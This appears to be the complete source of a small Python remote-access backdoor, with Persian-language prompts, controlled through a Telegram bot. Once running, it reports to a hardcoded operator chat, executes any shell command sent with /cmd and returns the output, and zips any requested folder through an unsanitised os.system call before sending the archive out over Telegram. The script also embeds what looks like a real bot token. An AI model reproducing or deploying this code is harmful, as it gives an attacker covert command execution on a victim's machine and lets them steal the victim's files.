import telebot, os

bot = telebot.TeleBot('1679790173:AAEUgoPKLVjv-fgg_UsfOgu8ZpkIGHPbTgY')

bot.send_message(1070821707, "✅اتصال برقرار شد")

def command(pm):
    d = os.popen(pm.text).read()
    bot.send_message(pm.chat.id, d)

def download(ad):
    cmd = 'zip file.zip '+ad.text
    os.system(cmd)
    file = open("file.zip", "rb")
    bot.send_document(ad.chat.id, file)
    os.system('rm file.zip')

@bot.message_handler(commands=['cmd'])
def cmd(message):
    str = bot.reply_to(message, ')SHARIAR(دستور را ارسال نمایید')
    bot.register_next_step_handler(str, command)

@bot.message_handler(commands=['download'])
def cmd(message):
    str = bot.reply_to(message, 'ادرس پوشه را ارسال نمایید')
    bot.register_next_step_handler(str, download)

bot.infinity_polling()
